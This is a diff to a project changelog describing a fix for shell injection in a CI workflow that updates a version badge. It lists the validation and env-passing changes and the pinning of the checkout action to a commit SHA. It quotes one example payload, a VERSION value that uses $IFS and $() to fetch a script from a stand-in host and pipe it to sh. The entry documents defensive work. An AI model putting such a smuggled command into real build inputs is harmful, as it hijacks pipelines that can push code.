@@ -167,6 +167,30 @@ field and the appliance.
   distinct, pre-existing header-drip vector the review surfaced (a hop dripping
   response *headers* inside `urlopen`, which the between-hop deadline can't
   interrupt) is filed as follow-up #176, not folded into this fix.
+- **The version-badge CI workflow no longer lets `VERSION` file content inject
+  shell in a `contents: write` job, and pins its action to a commit SHA (TQ-5,
+  #124 — LOW).** `sync-version-badge.yml` read the pushed version with
+  `cat VERSION` and textually interpolated `${{ steps.ver.outputs.version }}`
+  into three `run:` shells (a warn `echo`, the `sed` badge rewrite, and the
+  commit message) — so a `VERSION` of `1.5.2$(curl$IFS-sfL$IFSevil.sh|sh)` would
+  execute arbitrary commands in a job whose `GITHUB_TOKEN` can push to `main`
+  (the `tr -d '[:space:]'` there blocks spaces but not `$IFS`, `$()`, or
+  backticks). `sed`'s `|` delimiter also meant a `|`/`&`/`\` in the version
+  corrupted the replacement, and `actions/checkout` floated on the mutable tag
+  `@v4`. Now the version is validated against a strict semver pattern
+  (`^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$`, which keeps `1.4.0-rc1`-style
+  pre-release tags working while admitting no shell/sed metacharacter) and the
+  build fails loudly before use if it doesn't match; the value is then handed to
+  every shell via step-level `env:` and referenced as `"$VERSION"` — inert data,
+  never spliced into script text; and `actions/checkout` is pinned to the full
+  commit SHA `11bd719…af683` (v4.2.2, API-verified). Defense is layered:
+  validation rejects a payload up front, and env-passing keeps it inert even if
+  validation were bypassed. Verified by executing each step's shell — the old
+  interpolation runs an injected `$()` (RED), the env form does not, malformed
+  and empty versions are rejected, and the badge still rewrites correctly for
+  `1.5.4` and `1.4.0-rc1`; shellcheck-clean, YAML-valid; cold review SPEC /
+  QUALITY PASS. (Credit retained from the finding: `permissions:` was already
+  explicitly job-scoped, not default write-all.)
 
 ### Tests
 
